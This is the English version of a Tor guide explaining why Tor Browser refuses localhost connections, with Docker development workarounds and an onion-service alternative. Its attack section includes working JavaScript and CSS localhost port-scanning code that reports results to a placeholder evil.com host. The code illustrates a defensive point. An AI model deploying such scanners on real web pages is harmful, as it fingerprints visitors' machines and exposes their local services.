> **Lingua / Language**: [Italiano](../../06-configurazioni-avanzate/tor-e-localhost.md) | English

# Tor and Localhost - Why Tor Browser Does Not Access Local Services

This document explains in detail why Tor Browser blocks connections to
localhost/127.0.0.1, what attack it prevents, and what the solutions are. It includes
Docker scenarios, Kubernetes, local web development, and alternatives via onion services.

Based on my direct experience: while debugging a dockerized web application
(RESTful API on port 5173) on Kali Linux, Tor Browser refused the connection
to `localhost:5173`.

> **See also**: [Tor Browser and Applications](../04-strumenti-operativi/tor-browser-e-applicazioni.md)
> for browser comparison, [ProxyChains](../04-strumenti-operativi/proxychains-guida-completa.md)
> for behavior with localhost, [Onion Services v3](../03-nodi-e-rete/onion-services-v3.md)
> for the .onion alternative, [DNS Leak](../05-sicurezza-operativa/dns-leak.md).

---

## Table of Contents

- [The problem encountered](#the-problem-encountered)
- [Why Tor Browser blocks localhost](#why-tor-browser-blocks-localhost)
- [The attack: Local Service Discovery - deep dive](#the-attack-local-service-discovery--deep-dive)
- [The technical block in Tor Browser](#the-technical-block-in-tor-browser)
- [Solutions](#solutions)
**Deep dives** (dedicated files):
- [Tor and Localhost - Docker and Development](localhost-docker-e-sviluppo.md) - Docker, local web development, onion services, compatibility

---

## The problem encountered

Attempting to open a Docker application (port 5173) via Tor Browser:

```
Unable to connect
Firefox can't establish a connection to the server at localhost:5173.
```

Docker was working perfectly:
```yaml
# docker-compose.yml
services:
  api:
    build: .
    ports:
      - "5173:5173"
```

Verification:
```bash
# From normal Firefox: works
firefox http://localhost:5173

# From Tor Browser: refused
# "Unable to connect"

# From direct curl: works
curl http://localhost:5173/api/status
# {"status": "ok"}
```

---

## Why Tor Browser blocks localhost

### The technical reason

When Tor Browser receives a request to `localhost` or `127.0.0.1`:

```
Localhost request flow in Tor Browser:
1. User types: http://localhost:5173
2. Tor Browser: "localhost" -> must go through SOCKS5 proxy
3. SOCKS5 CONNECT -> sends "localhost:5173" to the Tor daemon
4. Tor: builds circuit -> Exit Node receives RELAY_BEGIN "localhost:5173"
5. Exit Node: connect(127.0.0.1:5173) -> ITS localhost, not yours!
6. Exit Node: "connection refused" (no service on port 5173)
7. Tor Browser: "Unable to connect"
```

But the block is not just for this technical reason. It is an **active security
measure** against enumeration attacks.

---

## The attack: Local Service Discovery - deep dive

### Port scanning via JavaScript

If Tor Browser allowed connections to localhost, a malicious site could
perform a complete port scan of your machine:

```html
<!-- evil.com includes: -->
<script>
const COMMON_PORTS = [
    3000, 3306, 5173, 5432, 5900, 6379, 8000, 8080, 8443,
    8888, 9000, 9051, 9090, 9200, 27017
];

async function scanPort(port) {
    return new Promise((resolve) => {
        const start = Date.now();
        const img = new Image();
        img.onload = () => resolve({port, status: 'open', time: Date.now() - start});
        img.onerror = () => {
            const elapsed = Date.now() - start;
            // Fast error (<50ms) = port open but not HTTP
            // Slow error (>1000ms) = port closed (timeout)
            resolve({
                port,
                status: elapsed < 50 ? 'open' : 'closed',
                time: elapsed
            });
        };
        img.src = `http://127.0.0.1:${port}/favicon.ico?${Math.random()}`;
        setTimeout(() => resolve({port, status: 'timeout', time: 5000}), 5000);
    });
}

// Scan all common ports
Promise.all(COMMON_PORTS.map(scanPort)).then(results => {
    const open = results.filter(r => r.status === 'open');
    // Send results to the attacker's server
    fetch('https://evil.com/report', {
        method: 'POST',
        body: JSON.stringify({ports: open})
    });
});
</script>
```

### Timing-based discovery

Even without receiving responses, timing reveals information:

```
Closed port: connect() fails after timeout (~2000ms)
Open port: connect() fails immediately (~5ms, "connection reset")
Filtered port: no response (timeout)

The time difference is measurable from JavaScript with <1ms precision
-> Sufficient to determine if a service is running
```

### WebSocket-based scanning

```javascript
function wsProbe(port) {
    return new Promise((resolve) => {
        const start = performance.now();
        const ws = new WebSocket(`ws://127.0.0.1:${port}`);
        ws.onopen = () => { ws.close(); resolve('open'); };
        ws.onerror = () => {
            const elapsed = performance.now() - start;
            resolve(elapsed < 100 ? 'open-no-ws' : 'closed');
        };
        setTimeout(() => { ws.close(); resolve('timeout'); }, 3000);
    });
}
```

### CSS-based probing (no JavaScript required)

```html
<!-- Works even with JavaScript disabled -->
<style>
@font-face {
    font-family: probe;
    src: url('http://127.0.0.1:5173/font.woff');
}
body { font-family: probe, fallback; }
</style>
<!-- If the port is open, the browser attempts to load the font -->
<!-- The fallback timing reveals whether the port responded -->
```

### Consequences of the attack

Based on discovered services:

| Discovered port | Information revealed |
|----------------|---------------------|
| 5173 | Vite dev server (frontend developer) |
| 3000 | React/Express (web developer) |
| 3306 | MySQL (has a local database) |
| 5432 | PostgreSQL |
| 6379 | Redis |
| 8080 | Tomcat/Proxy |
| 9051 | Tor ControlPort |
| 9200 | Elasticsearch |
| 27017 | MongoDB |

This information can:
- **Fingerprint the machine**: unique combination of services
- **Reveal the profession**: frontend dev, backend dev, DBA
- **Identify vulnerabilities**: unpatched services that are accessible
- **Attack local services**: if services do not require auth

---

## The technical block in Tor Browser

### The setting

Tor Browser sets in `about:config`:

```
network.proxy.allow_hijacking_localhost = false
```

This prevents any request from reaching:
- `127.0.0.0/8` (entire IPv4 loopback range)
- `::1` (IPv6 loopback)
- `0.0.0.0`
- `localhost` (hostname)

### Difference from Firefox + proxychains

```
Tor Browser:
  -> localhost blocked BEFORE reaching the proxy
  -> Active protection at the browser level

Firefox with tor-proxy profile via proxychains:
  -> localhost NOT blocked by the browser
  -> proxychains can decide: proxy or direct
  -> localnet 127.0.0.0/255.0.0.0 in proxychains4.conf
  -> Direct connection to localhost -> WORKS

Result:
  Tor Browser: localhost:5173 -> BLOCKED
  Firefox tor-proxy + proxychains: localhost:5173 -> WORKS (direct connection)
```

---

## Solutions

### 1. Use normal Firefox for local services (my solution)

```bash
# For local development: normal Firefox (not Tor)
firefox http://localhost:5173

# For anonymous browsing: Firefox with Tor profile
proxychains firefox -no-remote -P tor-proxy & disown
```

Separate the tools by use case. Anonymity is not needed for your own local services.

### 2. torsocks for CLI access to local services via Tor

```bash
# torsocks allows connections to localhost (with AllowOutboundLocalhost)
torsocks curl http://localhost:5173/api/status
```

In `torsocks.conf`:
```ini
AllowOutboundLocalhost 1
```

### 3. Modify the setting in Tor Browser (discouraged)

In `about:config`:
```
network.proxy.allow_hijacking_localhost = true
```

**WARNING**: exposes you to Local Service Discovery attacks. Only do this
temporarily for debugging on trusted networks. Remember to restore the setting.

### 4. Expose the service via onion service (the secure solution)

Instead of bypassing the protection, expose the local service as `.onion`:

```ini
# torrc
HiddenServiceDir /var/lib/tor/myapp/
HiddenServicePort 80 127.0.0.1:5173
```

Then access via Tor Browser with the `.onion` address. No bypass needed,
security is preserved.


---

> **Continues in**: [Tor and Localhost - Docker, Web Development and Onion Services](localhost-docker-e-sviluppo.md)
> for Docker, local web development, onion services, and compatibility matrix.

---

## See also

- [Tor and Localhost - Docker and Development](localhost-docker-e-sviluppo.md) - Docker, local web development, onion services, compatibility
- [Onion Services v3](../03-nodi-e-rete/onion-services-v3.md) - Secure alternative for exposing local services
- [Multi-Instance and Stream Isolation](multi-istanza-e-stream-isolation.md) - Tor instances for different services
- [Transparent Proxy](transparent-proxy.md) - TransPort and interaction with localhost
- [Real-World Scenarios](scenari-reali.md) - Operational cases from a pentester
